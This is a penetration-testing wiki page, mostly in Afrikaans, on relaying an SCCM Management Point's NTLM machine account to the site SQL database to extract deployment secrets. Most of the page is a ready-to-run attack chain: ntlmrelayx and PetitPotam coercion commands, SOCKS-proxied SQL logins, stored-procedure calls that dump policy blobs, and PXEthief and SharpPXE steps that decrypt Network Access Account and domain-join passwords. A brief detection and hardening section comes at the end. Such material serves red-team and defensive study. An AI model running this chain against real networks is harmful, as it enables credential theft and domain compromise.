# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Deur ’n **System Center Configuration Manager (SCCM) Management Point (MP)** te dwing om oor SMB/RPC te authenticate en daardie NTLM-masjienrekening na die **site database (MSSQL)** te **relay**, verkry jy `smsdbrole_MP` / `smsdbrole_MPUserSvc`-regte. Hierdie rolle laat jou toe om ’n stel stored procedures aan te roep wat **Operating System Deployment (OSD)**-policy blobs blootlê (Network Access Account credentials, Task-Sequence variables, ens.). Die blobs is hex-encoded/encrypted, maar kan met **PXEthief** decoded en decrypted word, wat plaintext secrets oplewer.

Hoëvlak-ketting:
1. Ontdek MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Coerce MP met **PetitPotam**, PrinterBug, DFSCoerce, ens.
4. Koppel deur die SOCKS proxy met `mssqlclient.py -windows-auth` as die relayed **<DOMAIN>\\<MP-host>$** account.
5. Execute:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (of `MP_GetPolicyBodyAfterAuthorization`)
6. Verwyder `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secrets soos `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, ens. word recovered sonder om aan PXE of clients te raak.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
Die MP ISAPI extension **GetAuth.dll** stel verskeie parameters bloot wat nie authentication vereis nie (tensy die site PKI-only is):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Returns site signing cert public key + GUIDs van *x86* / *x64* **All Unknown Computers** devices. |
| `MPLIST` | Lists elke Management-Point in die site. |
| `SITESIGNCERT` | Returns Primary-Site signing certificate (identify the site server sonder LDAP). |

Kry die GUIDs wat as die **clientID** vir latere DB queries sal optree:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay die MP machine account na MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Wanneer die coercion geaktiveer word, behoort jy iets soos die volgende te sien:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifiseer OSD-beleide via stored procedures
Koppel deur die SOCKS-proxy (poort 1080 by verstek):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Skakel oor na die **CM_<SiteCode>**-databasis (gebruik die 3-syfer-werfkode, bv. `CM_001`).

### 3.1  Vind GUID's vir Unknown-Computer (opsioneel)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lys toegewysde beleide
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Elke ry bevat `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Fokus op policies:
* **NAAConfig** – Network Access Account-bewyse
* **TS_Sequence** – Task Sequence-veranderlikes (OSDJoinAccount/Password)
* **CollectionSettings** – Kan run-as-rekeninge bevat

### 3.3  Haal volledige body op
As jy reeds `PolicyID` & `PolicyVersion` het, kan jy die clientID-vereiste oorslaan deur die volgende te gebruik:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> BELANGRIK: Verhoog “Maximum Characters Retrieved” in SSMS (>65535), anders sal die blob afgekap word.

---

## 4. Dekodeer & decrypt die blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Voorbeeld van herwonne geheime:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevante SQL-rolle en -prosedures
Met relay word die login gekarteer na:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Hierdie rolle stel dosyne EXEC-permissies bloot; die belangrikste wat in hierdie attack gebruik word, is:

| Stored Procedure | Doel |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Lys policies wat op ’n `clientID` toegepas word. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Gee die volledige policy body terug. |
| `MP_GetListOfMPsInSiteOSD` | Word deur die `MPKEYINFORMATIONMEDIA`-path teruggegee. |

Jy kan die volledige lys inspekteer met:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE-bootmedia-oes (SharpPXE)
* **PXE-reply oor UDP/4011**: stuur ’n PXE-bootversoek na ’n Distribution Point wat vir PXE gekonfigureer is. Die proxyDHCP-antwoord onthul bootpaaie soos `SMSBoot\\x64\\pxe\\variables.dat` (geënkripteerde konfigurasie) en `SMSBoot\\x64\\pxe\\boot.bcd`, plus ’n opsionele geënkripteerde sleutelblob.<sup>[[4]](#references)</sup>
* **Haal bootartefakte via TFTP op**: gebruik die teruggestuurde paaie om `variables.dat` via TFTP af te laai (sonder verifikasie). Die lêer is klein (’n paar KB) en bevat die geënkripteerde mediaveranderlikes.
* **Dekripteer of kraak**:
- Indien die antwoord die dekripsiesleutel insluit, voer dit aan **SharpPXE** om `variables.dat` direk te dekripteer.
- Indien geen sleutel verskaf word nie (PXE-media word deur ’n pasgemaakte wagwoord beskerm), genereer SharpPXE ’n **Hashcat-compatible** `$sccm$aes128$...` hash vir offline cracking. Nadat die wagwoord herwin is, dekripteer die lêer.
* **Ontleed gedekripteerde XML**: plaintext-veranderlikes bevat SCCM-deploymentmetadata (**Management Point URL**, **Site Code**, mediagidsse en ander identifiseerders). SharpPXE ontleed dit en druk ’n gereed-vir-uitvoering **SharpSCCM**-opdrag met GUID/PFX/site-parameters wat vooraf ingevul is vir opvolgende misbruik.
* **Vereistes**: slegs netwerkbereikbaarheid na die PXE-listener (UDP/4011) en TFTP; geen plaaslike adminvoorregte word benodig nie.

---

## 7. Opsporing & Verharding
1. **Monitor MP-aanmeldings** – enige MP-rekenaarrekening wat vanaf ’n IP-adres aanmeld wat nie sy gasheer is nie ≈ relay.<sup>[[1]](#references)</sup>
2. Aktiveer **Extended Protection for Authentication (EPA)** op die site-databasis (`PREVENT-14`).
3. Deaktiveer ongebruikte NTLM, dwing SMB-signing af, beperk RPC (
dieselfde versagtings wat teen `PetitPotam`/`PrinterBug` gebruik word).
4. Verhard MP ↔ DB-kommunikasie met IPSec / mutual-TLS.
5. **Beperk PXE-blootstelling** – firewall UDP/4011 en TFTP tot vertroude VLAN’s, vereis PXE-wagwoorde, en waarsku oor TFTP-aflaaie van `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Sien ook
* NTLM relay-grondbeginsels:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL-misbruik & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## Verwysings
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
